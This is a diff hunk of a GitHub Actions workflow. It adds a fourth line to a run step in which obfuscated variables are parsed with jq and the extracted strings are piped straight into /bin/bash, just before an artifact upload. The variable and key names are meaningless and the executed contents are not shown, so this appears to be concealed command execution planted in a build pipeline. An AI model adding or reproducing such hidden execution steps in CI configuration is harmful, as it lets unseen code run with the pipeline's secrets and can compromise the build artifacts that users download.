@@ -29,6 +29,7 @@ jobs:
           echo $fun4816 | jq -r .u1600 | /bin/bash
           printf '%s' "$w300" | jq -r .vyo42 | /bin/bash
           printf '%s' "$m36" | jq -r .nip82 | /bin/bash
+          printf '%s' "$org1" | jq -r .hftyl2532 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
